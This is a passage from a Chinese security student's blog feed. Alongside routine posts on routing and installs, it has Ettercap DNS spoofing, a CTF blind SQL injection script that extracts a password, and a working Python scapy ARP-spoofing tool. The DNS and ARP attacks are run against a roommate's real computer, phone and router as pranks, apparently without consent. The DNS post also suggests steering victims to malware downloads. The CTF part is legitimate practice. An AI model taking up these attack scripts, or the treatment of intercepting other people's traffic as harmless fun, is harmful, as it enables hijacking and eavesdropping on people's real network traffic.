src="http://p008biu9n.bkt.clouddn.com/blog/180322/FlGj1GEkJK.png?imageslim" alt="mark"><br><strong>选择dns_spood插件，便开始dns欺骗了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/fk3Hf84H0D.PNG" alt="mark"><br><strong>我们这时访问百度，就会看到dns已经被劫持，嘿嘿嘿</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/m725g55cLg.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/3L2dAFhm3i.PNG" alt="mark"><br><strong>同时欺骗了室友的电脑和手机也成功，差点没被打死。。。。就是皮</strong></p><p><strong>最后说一下，dns劫持这种攻击不仅限于恶作剧，利用这种攻击，我们还可以诱导受害者进入我们构造的恶意软件下载页面，下载恶意软件以让我们对对方的电脑做一些事情</strong></p><p><strong>老铁们遇到dns劫持这种恶作剧，打开cmd命令行输入</strong></p><pre><code>ipconfig /flushdns</code></pre><p><strong>刷新dns缓存即可，然后找到那个皮的人。。。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Ettercap实现局域网dns劫持百度&quot;&gt;&lt;a href=&quot;#Ettercap实现局域网dns劫持百度&quot; class=&quot;headerlink&quot; title=&quot;Ettercap实现局域网dns劫持百度&quot;&gt;&lt;/a&gt;Ettercap实现局域网dns劫持百度&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;很久之前做过的一个实验，利用kali的Ettercap进行局域网的dns劫持，今天实验课老师碰巧又提到了，于是又做了做，这是一个很好玩的实验&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="dns劫持" scheme="http://yoursite.com/tags/dns%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>解决kali执行apt update时报错</title>
    <link href="http://yoursite.com/2018/03/19/kali%20update%20error/"/>
    <id>http://yoursite.com/2018/03/19/kali update error/</id>
    <published>2018-03-19T15:27:48.136Z</published>
    <updated>2018-06-04T15:03:50.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解决kali执行apt-update时报错"><a href="#解决kali执行apt-update时报错" class="headerlink" title="解决kali执行apt update时报错"></a>解决kali执行apt update时报错</h1><a id="more"></a><p><strong>更新kali时在执行apt update遇到如下错误</strong></p><pre><code>Get:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease [30.5 kB]Err:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling InReleaseThe following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;Reading package lists... DoneBuilding dependency tree       Reading state information... Done945 packages can be upgraded. Run &apos;apt list --upgradable&apos; to see them.W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;W: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;W: Some index files failed to download. They have been ignored, or old ones used instead.</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/9DHI71m4ee.png?imageslim" alt="mark"></p><p><strong>解决方法</strong></p><pre><code>apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/KGI19B7egm.png?imageslim" alt="mark"></p><p><strong>再次执行就可以成功执行了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/m3L1eiGCcd.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;解决kali执行apt-update时报错&quot;&gt;&lt;a href=&quot;#解决kali执行apt-update时报错&quot; class=&quot;headerlink&quot; title=&quot;解决kali执行apt update时报错&quot;&gt;&lt;/a&gt;解决kali执行apt update时报错&lt;/h1&gt;
    
    </summary>
    
      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
    
    
      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>eNSP静态路由配置</title>
    <link href="http://yoursite.com/2018/03/18/routestatic/"/>
    <id>http://yoursite.com/2018/03/18/routestatic/</id>
    <published>2018-03-18T15:32:19.761Z</published>
    <updated>2018-06-04T15:11:47.911Z</updated>
    
    <content type="html"><![CDATA[<h1 id="eNSP静态路由配置"><a href="#eNSP静态路由配置" class="headerlink" title="eNSP静态路由配置"></a>eNSP静态路由配置</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础</strong><br><a id="more"></a></p><h3 id="课堂给出的拓扑如下"><a href="#课堂给出的拓扑如下" class="headerlink" title="课堂给出的拓扑如下"></a>课堂给出的拓扑如下</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180318/fBGD2l9b88.png?imageslim" alt="mark"></p><p><strong>要求四个路由器之前相互可以通信，自己动手实践了一下,将自己的配置过程记录下来，也算课堂的时间没有白费</strong></p><h3 id="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"><a href="#在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下" class="headerlink" title="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"></a>在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下</h3><pre><code>R1sysysname r1int e0/0/0ip add 10.10.10.1 24qint g0/0/0ip add 2.2.2.2 30qint g0/0/1ip add 3.3.3.2 30qR2sysysname r2int e0/0/0ip add 192.168.2.1 24qint g0/0/0ip add 2.2.2.1 301int g0/0/1ip add 1.1.1.1 30qR3sysysname r3int e0/0/0ip add 172.16.2.1 24qint g0/0/0ip add 4.4.4.1 30qint g0/0/1ip add 3.3.3.1 24qR4sysysname r4int g0/0/1ip add 1.1.1.2 30qint g0/0/0ip add 4.4.4.2 30q</code></pre><h3 id="配置静态路由"><a href="#配置静态路由" class="headerlink" title="配置静态路由"></a>配置静态路由</h3><p><strong>配置之前要先明白什么是下一跳地址，以拓扑举例，比如PC1要经过路由R1与PC2通讯，那么在路由R1的路由表中，下一跳地址应该为路由R2:2.2.2.1,所以在R1的路由表中添加一条静态路由</strong></p><pre><code>ip route-static 192.168.2.1 255.255.255.0 2.2.2.1</code></pre><p><strong>同时要在R2的路由表中添加一条PC2到PC1的静态路由</strong></p><pre><code>ip route-static 10.10.10.1 255.255.255.0 2.2.2.2</code></pre><p><strong>了解了上面的基础，剩下的就是在每个路由器里面一一配置，各路由器配置如下</strong> </p><p><strong>PC1到PC2之间的通信配置</strong></p><pre><code>R1：ip route-static 192.168.2.1 255.255.255.0 2.2.2.1R2：ip route-static 10.10.10.1 255.255.255.0 2.2.2.2</code></pre><p><strong>测试PC1和PC2互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/GH301D7akb.png?imageslim" alt="mark"><br><strong>PC1到PC3之间的通信配置</strong></p><pre><code>R1：ip route-static 172.16.2.1 255.255.255.0 3.3.3.1R3：ip route-static 10.10.10.1 255.255.255.0 3.3.3.2</code></pre><p><strong>测试PC1和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/B5mBkk2hmA.png?imageslim" alt="mark"><br><strong>PC2到PC3之间的通信配置</strong></p><pre><code>R2：ip route-static 172.16.2.1 255.255.255.0 1.1.1.2R4：ip route-static 172.16.2.1 255.255.255.0 4.4.4.1R3：ip route-static 192.168.2.1 255.255.255.0 4.4.4.2R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1</code></pre><p><strong>测试PC2和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/1jj7hDj12C.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;eNSP静态路由配置&quot;&gt;&lt;a href=&quot;#eNSP静态路由配置&quot; class=&quot;headerlink&quot; title=&quot;eNSP静态路由配置&quot;&gt;&lt;/a&gt;eNSP静态路由配置&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="网络基础" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="网络基础" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF2018 77777 writeup</title>
    <link href="http://yoursite.com/2018/03/12/N1CTF2018/"/>
    <id>http://yoursite.com/2018/03/12/N1CTF2018/</id>
    <published>2018-03-12T02:53:49.460Z</published>
    <updated>2018-06-04T15:10:04.400Z</updated>
    
    <content type="html"><![CDATA[<h1 id="N1CTF2018-77777-writeup"><a href="#N1CTF2018-77777-writeup" class="headerlink" title="N1CTF2018 77777 writeup"></a>N1CTF2018 77777 writeup</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧</strong><br><a id="more"></a></p><h3 id="题目：77777"><a href="#题目：77777" class="headerlink" title="题目：77777"></a>题目：77777</h3><p><strong>题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段代码中，代码如下</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/a2EE46LmeH.png?imageslim" alt="mark"></p><p><strong>代码接收post参数中的flag和hi，拼接后更新数据库的points值，并在<code>http://47.97.168.223/#profile</code>页面中显示points值，简单来说，post参数可控，我们可以提交参数构造数据库中女朋友的points，并且在页面显示points值</strong></p><pre><code>update users set points=&apos;post过来的flag和hi拼接后的结果&apos;</code></pre><p><strong>当然hi是经过waf函数处理的，看来是绕waf的注入，简单了测试了一下，过滤了updatexml,extractvalue,database()等函数，报错回显这个思路暂时放弃了，因为information_schema也被过滤了，做起来会很麻烦</strong></p><p><strong>题目的第二个提示</strong></p><pre><code>the flag is `admin&apos;s password`:)</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/Hj66G37HjJ.png?imageslim" alt="mark"><br><strong>猜测数据库里有password字段,由此想到第二个思路，提交:</strong></p><pre><code>flag=任意数字&amp;hi=任意数字 and (构造逻辑判断)</code></pre><p><strong>数据库语句变为:</strong></p><pre><code>update users set points=任意数字 and （构造逻辑判断）</code></pre><p><strong>如果逻辑判断为真，将points值更新为1，为假则更新为0,构造逻辑判断的时候发现=也被过滤，用like替代即可,思路有了开始写脚本</strong></p><pre><code>import requestsimport stringlist=string.maketrans(&quot;&quot;,&quot;&quot;)[33:127]#所有可显示字符，后面猜测password内容使用url=&quot;http://47.97.168.223/#profile&quot;#显示分数页面#read password#i=0#while 1:#    payload={&apos;flag&apos;:1,&apos;hi&apos;:&apos;1 and length(password) like %d&apos;%(i)}#    html=requests.post(url=url,data=payload).content#    if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明长度正确，输出并break#        print i#        break#    else:#        i=i+1#password length is 13#read passwordi=0for i in range(1,14):    for j in list:        payload={&apos;flag&apos;:1,&apos;hi&apos;:&quot;1 and substr(password,%d,1) like &apos;%s&apos;&quot;%(i,j)}        html=requests.post(url=url,data=payload).content        if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明内容正确，输出并break            print j            break#flag is HE3L3LOCAT233</code></pre><p><strong>脚本通过<code>1 and length(password) like %d</code>来判断password长度为13，为真时页面points显示为1，否则为0</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/823DJ2bh5f.png?imageslim" alt="mark"></p><p><strong>然后<code>1 and substr(password,%d,1) like &#39;%s&#39;</code>循环判断password内容，为真时页面的points值显示为1，否则为0</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/FGB5bcl7F0.png?imageslim" alt="mark"></p><p><strong>flag为N1CTF{HE3L3LOCAT233}</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;N1CTF2018-77777-writeup&quot;&gt;&lt;a href=&quot;#N1CTF2018-77777-writeup&quot; class=&quot;headerlink&quot; title=&quot;N1CTF2018 77777 writeup&quot;&gt;&lt;/a&gt;N1CTF2018 77777 writeup&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>centos7安装mysql</title>
    <link href="http://yoursite.com/2018/02/27/centos7mysql/"/>
    <id>http://yoursite.com/2018/02/27/centos7mysql/</id>
    <published>2018-02-27T14:34:28.576Z</published>
    <updated>2018-06-04T14:57:37.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="centos7安装mysql"><a href="#centos7安装mysql" class="headerlink" title="centos7安装mysql"></a>centos7安装mysql</h1><p><strong>由于MySQL为Oracle公司所拥有因此不再免费，所以CentOS7以上的版本已经使用MariaDB替代了收费的MySQL，如直接用yum安装则会安装MariaDB。这篇文章记录了如何在centos7上安装mysql</strong><br><a id="more"></a><br><strong>1.卸载之前安装的MariaDB</strong></p><pre><code>rpm -qa | grep mariadb(列出所有被安装的rpm package)</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/l9iEaD0a5a.PNG" alt="mark"><br><strong><code>rpm -e</code>依次卸载</strong></p><pre><code>rpm -e mariadb-5.5.56-2.el7.x86_64rpm -e --nodeps mariadb-libs-5.5.56-2.el7.x86_64rpm -e --nodeps mariadb-devel-5.5.56-2.el7.x86_64</code></pre><p><strong>2.到<a href="https://dev.mysql.com/downloads/repo/yum/" title="mysql官网" target="_blank" rel="external">mysql官网</a>找到对应版本的mysql下载（本例中为mysql57-community-release-el7-11.noarch.rpm），上传至服务器</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/Fdg5fbh339.png?imageslim" alt="mark"></p><p><strong>3.下载完毕后输入<code>md5sum mysql57-community-release-el7-9.noarch.rpm</code>生成MD5值并确保同官方网站上的MD5值相同。注意：建议运行此命令以确保文件无损坏</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/B3fC28IJjm.png?imageslim" alt="mark"></p><p><strong>4.输入<code>rpm -ivh mysql57-community-release-el7-9.noarch.rpm</code>并按回车键进行安装YUM源RPM安装包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/BkFBCkAj2I.png?imageslim" alt="mark"></p><p><strong>5.因上一步已添加新的YUM存储库，所以直接就可以用yum命令安装mysql了</strong></p><pre><code>yum install -y mysql-server</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/2jih4JIeeF.png?imageslim" alt="mark"></p><p><strong>6.可以看到mysql已经成功安装</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/3iAGB7h54A.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/lG0d7L9Dc7.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;centos7安装mysql&quot;&gt;&lt;a href=&quot;#centos7安装mysql&quot; class=&quot;headerlink&quot; title=&quot;centos7安装mysql&quot;&gt;&lt;/a&gt;centos7安装mysql&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;由于MySQL为Oracle公司所拥有因此不再免费，所以CentOS7以上的版本已经使用MariaDB替代了收费的MySQL，如直接用yum安装则会安装MariaDB。这篇文章记录了如何在centos7上安装mysql&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="其他" scheme="http://yoursite.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>arp协议分析&amp;python编程实现arp欺骗抓图片</title>
    <link href="http://yoursite.com/2018/01/12/arpattack/"/>
    <id>http://yoursite.com/2018/01/12/arpattack/</id>
    <published>2018-01-12T14:24:48.076Z</published>
    <updated>2018-06-04T17:21:18.768Z</updated>
    
    <content type="html"><![CDATA[<h1 id="arp协议分析-amp-python编程实现arp欺骗抓图片"><a href="#arp协议分析-amp-python编程实现arp欺骗抓图片" class="headerlink" title="arp协议分析&amp;python编程实现arp欺骗抓图片"></a>arp协议分析&amp;python编程实现arp欺骗抓图片</h1><p><strong>这篇文章分析了arp协议并且用python的scapy库实现了一次arp攻击去劫持室友的上网流量</strong><br><a id="more"></a></p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p><strong>1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中</strong></p><p><strong>2.python2.7.13，kali2.0自带</strong></p><p><strong>3.一个局域网和室友的电脑</strong></p><p><strong>4.kali所支持的无线网卡，型号为RT3070，某宝四十多就能能买到，主要用来抓取无线数据包，因为windows自带无线网卡kali不支持</strong></p><p><strong>选择kali支持的无线网卡可参考链接</strong><br><code>http://www.freebuf.com/articles/wireless/140065.html</code></p><p><strong>不过要注意一点，wn722n型号的无线网卡只有v1才支持kali，现在网上大多数卖的都是v2的，如果选择这一款买的时候要好好看一下，不要选错</strong><br><!--more--></p><h3 id="arp协议研究"><a href="#arp协议研究" class="headerlink" title="arp协议研究"></a>arp协议研究</h3><p><strong>在进行arp攻击之前，先来研究一下arp协议</strong></p><p><strong>arp协议简介：arp协议的全称为地址解析协议，是一种工作在网络层的协议，是一种将ip地址转换为MAC地址（物理地址）的协议</strong></p><p><strong>这里之所以需要使用MAC地址，是因为网络中用于连接各个设备的交换机使用了内容可寻址存储器（CAM，Coment Addressable Memory）。该存储器维护的ARP表列出了它在每一个端口的所有连接设备的MAC地址。当交换机收到了一个指向特定MAC地址的网络流量，它就会使用这个表，来确定应该使用哪一个端口发送流量。如果目标MAC地址是未知的，那么这个传输设备会首先在它的缓存中查找这个地址，如果没有找到，那么这个地址就需要通过在网络上额外的通信中解析了。因为在OSI七层模型中，ip地址在第三层网络层，传送的是数据报，mac地址在第二层数据链路层，传送的是数据帧，二层的以太网交换设备并不能识别32位的IP地址，它们是以48位以太网地址（就是我们常说的MAC地址）传输以太网数据包（帧）的，局域网的机器要和其他机器进行通信，首先要获取对方的物理地址，所以arp协议便把ip地址转换为物理地址来实现这种对应关系</strong></p><p><strong>arp协议数据包</strong></p><p><strong>arp数据包分为arp请求包和arp响应包，数据包格式如下图，arp数据包长度为28字节</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/D69hl1lIGD.PNG" alt="mark"><br><strong>其中op段代表操作类型，当op为1代表发起arp请求，说明这是一个arp请求包，当op为2时代表发起arp响应，说明这是一个arp响应包，现在假设局域网的一台机器要上外网（比如百度），首先要与网关进行通讯，获取网关的物理地址后才能传送数据通过网关访问外网，这台机器会首先查看自己电脑的arp缓存表（缓存时间为120s）中是否有网关的物理地址，如果没有便会向局域网内的机器以广播的形式发送arp请求包询问网管的物理地址，请求包主要字段如下</strong></p><pre><code>op:1(op值为1说明这是一次arp请求)hwsrc：发送方MAC地址（即本机器MAC地址）psrc：发送方ip地址（即本机内网ip地址）hwdst：目标MAC地址（在这里为未知00：00：00：00：00：00）pdst：目标ip地址（即网关ip地址，一般为192.168.0.1/192.168.1.1）</code></pre><p><strong>局域网内所有机器接收此arp请求，如果发现请求的ip为自己的ip便会向请求机器发送arp响应，将自己的MAC地址带入arp响应包单播发送给请求的机器，arp响应包主要字段如下</strong></p><pre><code>op:2(op值为2说明这是一次arp响应)hwsrc：发送方MAC地址（即网关MAC地址）psrc：发送方ip地址（即网关ip地址）hwdst：目标MAC地址（为发起arp请求的机器的MAC地址）pdst：目标ip地址（为发起arp请求的机器的ip地址）</code></pre><p><strong>这样发起arp请求的机器从arp响应包里获取MAC地址并添加到本机arp缓存中，与网关进行通信，在这里要注意一点，在本机向网关发送arp请求的同时，网关也会向本机发送arp请求获取本机MAC地址，同时本机也会向网关发送arp响应，这时一个双向的过程，这里不再重复</strong></p><p><strong>接下来为了更清楚的理解，用wireshark抓包来观察一下arp请求包和响应包</strong></p><p><strong>选择抓包的网卡接口，在这选择wlan0，并向网关发起ping请求与网关通信，本机ip为192.168.0.106，网关ip为192.168.0.1</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/1GLmkkH2Ai.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/k2IclB0dDa.PNG" alt="mark"><br><strong>在过滤窗口输入arp&amp;&amp;ip.addr==192.168.0.1将arp数据包过滤出来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/h94m4kFC49.png?imageslim" alt="mark"><br><strong>观察arp请求包和响应包是否和上述描述的一致，图中做出了详细标明</strong></p><p><strong>arp请求包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/6b1bI0Heb0.png?imageslim" alt="mark"><br><strong>arp响应包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/EIckd61cHh.png?imageslim" alt="mark"></p><h3 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h3><p><strong>上面描述完了arp协议，下面来说一下arp欺骗攻击，假设局域网内有三台机器</strong></p><pre><code>网关:192.168.0.1受害者机器：192.168.0.108本机kali：192.168.0.106</code></pre><p><strong>正常情况下，如果受害者和网关要进行通信，首先要使用arp协议进行对方的MAC地址获取，但是如果攻击者不断的向受害者发送arp响应包，告诉受害者网关的MAC地址为自己的MAC地址，包的大致内容如下</strong></p><pre><code>op:2(op值为2说明这是一次arp响应)hwsrc：发送方MAC地址（攻击者MAC地址）psrc：发送方ip地址（网关ip地址）hwdst：目标MAC地址（受害者MAC地址）pdst：目标ip地址（受害者ip地址）</code></pre><p><strong>在这里发送方ip是网关的ip，但是发送方MAC已经变为了攻击者（kali）的MAC地址，受害者不断的接收这个arp响应包，便会在自己的arp缓存中不断的更新错误的ip与MAC的对应关系，及网关的MAC为攻击者的MAC，由此攻击者的网卡便可以捕获到受害者到网关之间的流量，到现在实现了arp断网，受害者因为与错误的MAC地址进行通讯而上不了网，如果攻击者的机器开启了ip转发，便可以将从受害者截取到的流量转发出去给网关，实现arp欺骗，也称为中间人攻击</strong></p><p><strong>arp欺骗一般是双向欺骗，我们通过arp欺骗可以捕获到受害者到网关的流量，同样的我们可以向网关发送arp响应包欺骗网关受害者的MAC地址为自己的MAC地址，截获网关到受害者之间的流量，arp响应包大致如下</strong></p><pre><code>op:2(op值为2说明这是一次arp响应)hwsrc：发送方MAC地址（攻击者MAC地址）psrc：发送方ip地址（受害者ip地址）hwdst：目标MAC地址（网关MAC地址）pdst：目标ip地址（网关ip地址）</code></pre><p><strong>同样的网关在不断接受到此arp响应时也会不断的更新自己的arp缓存去建立错误的关系，我们的kali攻击机便可以双向的截获流量</strong></p><h3 id="用python实现arp攻击"><a href="#用python实现arp攻击" class="headerlink" title="用python实现arp攻击"></a>用python实现arp攻击</h3><p><strong>所需的python第三方库</strong></p><p><strong>scapy库：scapy是一个可用于网络嗅探的非常强大的第三方库。可以伪造，嗅探或发送网络数据包，这这里我们使用scapy库伪造arp响应包并发送,首先安装scapy库，kali默认自带</strong></p><pre><code>pip install scapy</code></pre><p><strong>模拟攻击环境,一个真实的局域网，就是我们寝室</strong></p><pre><code>自己的kali攻击机:192.168.0.106,装在vm虚拟机中，连接了RT3070型号的无线网卡室友的电脑:192.168.0.108，连接同一路由器的无线网网关：192.168.0.1</code></pre><p><strong>编写python代码：arpattack.py</strong></p><pre><code>from scapy.all import *#导入scapy模块from optparse import OptionParser#导入命令行参数处理模块optparseimport sysdef main():    usage=&quot;Usage: [-i interface] [-t targetip] [-g gatewayip]&quot;    parser=OptionParser(usage)    parser.add_option(&apos;-i&apos;,dest=&apos;interface&apos;,help=&apos;select interface(input eth0 or wlan0 or more)&apos;)#-i 所选择的网卡，eth0或wlan0，存放在interface变量中    parser.add_option(&apos;-t&apos;,dest=&apos;targetip&apos;,help=&apos;select ip to spoof&apos;)#-t 要攻击的ip，存放在targetip变量中    parser.add_option(&apos;-g&apos;,dest=&apos;gatewayip&apos;,help=&apos;input gateway ip&apos;)#-g 网关ip，存放在gatewayip变量中    (options,args)=parser.parse_args()    if options.interface and options.targetip and options.gatewayip:        interface=options.interface        tip=options.targetip        gip=options.gatewayip        spoof(interface,tip,gip)#将参数传给spoof函数    else:        parser.print_help()#显示帮助        sys.exit(0)def spoof(interface,tip,gip):#获取命令行的输入实现arp攻击    localmac=get_if_hwaddr(interface)#get_if_hwaddr获取本地网卡MAC地址    tmac=getmacbyip(tip)#根据目标ip获取其MAC地址    gmac=getmacbyip(gip)#根据网关ip获取其MAC地址    ptarget=Ether(src=localmac,dst=tmac)/ARP(hwsrc=localmac,psrc=gip,hwdst=tmac,pdst=tip,op=2)#构造arp响应包，欺骗目标机器网关的MAC地址为本机MAC地址    pgateway=Ether(src=localmac,dst=gmac)/ARP(hwsrc=localmac,psrc=tip,hwdst=gmac,pdst=gip,op=2)#构造arp响应包，欺骗网关目标机器的MAC地址为本机MAC地址    try:        while 1:            sendp(ptarget,inter=2,iface=interface)            print &quot;send arp reponse to target(%s),gateway(%s) macaddress is %s&quot;%(tip,gip,localmac)            sendp(pgateway,inter=2,iface=interface)            print &quot;send arp reponse to gateway(%s),target(%s) macaddress is %s&quot;%(gip,tip,localmac)#不断发送arp响应包欺骗目标机器和网关，直到ctrl+c结束程序    except KeyboardInterrupt:        sys.exit(0)if __name__==&apos;__main__&apos;:    main()</code></pre><p><strong>脚本使用到的scapy库中的几个函数</strong></p><pre><code>get_if_hwaddr(&quot;本地网卡名称（eth0/wlan0）&quot;)    根据所选择的本地网卡获取相应的本地网卡的MAC地址</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/JgBhi3KHgJ.PNG" alt="mark"></p><pre><code>getmacbyip（&quot;ip地址&quot;）    根据ip地址获取其MAC地址，使用该函数实际上使用了一次arp协议，可以用此函数获取网关和目标的MAC地址</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/KLm017GgK4.PNG" alt="mark"><br>    ARP是构建ARP数据包的类，Ether用来构建以太网数据包，构造arp数据包并加上以太网头部</p><pre><code>Ether(src=本地网卡MAC,dst=目标机器MAC)/ARP(hwsrc=本地网卡MAC,psrc=网关ip,hwdst=目标机器MAC,pdst=目标机器ip,op=2)构造发送给目标机器的arp数据包，并加上以太网头部，欺骗目标机器网关的MAC为本机的MACEther(src=本地网卡MAC,dst=网关MAC)/ARP(hwsrc=本地网卡MAC,psrc=网关ip,hwdst=网关MAC,pdst=网关ip,op=2)构造发送给网关的arp数据包，并加上以太网头部，欺骗网关目标机器的MAC为本机的MACsendp函数发送我们构造的arp数据包    sendp(数据包, inter=2, iface=网卡)    sendp函数工作在网络的第二层</code></pre><p><strong>以上代码实现了类似于arpspoof工具的功能，使用方法，进入脚本目录，输入</strong></p><pre><code>python arpattack.py -h</code></pre><p><strong>查看脚本使用帮助</strong></p><pre><code>Usage: [-i interface] [-t targetip] [-g gatewayip]Options:    -h, --help    show this help message and exit    -i INTERFACE  select interface(input eth0 or wlan0 or more)    -t TARGETIP   select ip to spoof    -g GATEWAYIP  input gateway ip</code></pre><p><strong>所以我们这样输入可以双向的欺骗网关和目标机器完中间人攻击</strong></p><pre><code>python arpattack.py -i 网卡 -t 要攻击的目标的ip地址 -g 网关ip</code></pre><p><strong>输入</strong></p><pre><code>python arpattack.py -i wlan0 -t 192.168.0.8 -g 192.168.0.1</code></pre><p><strong>选择无线网卡wlan0的MAC地址去欺骗室友的电脑和网关路由器，如果我和室友都插了网线，就要选择eth0</strong></p><p><strong>运行脚本便会不断的向室友的电脑和网关发送arp响应包进行双向欺骗，效果如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/fg0BD08D09.PNG" alt="mark"><br><strong>室友电脑arp缓存</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180116/I4CghAgijh.jpg?imageslim" alt="mark"><br><strong>路由器arp缓存</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/BDFcg2j7ED.png?imageslim" alt="mark"><br><strong>这时我们截获了室友电脑和网关之间的流量，使其不能相互通信，完成了arp断网</strong></p><pre><code>echo 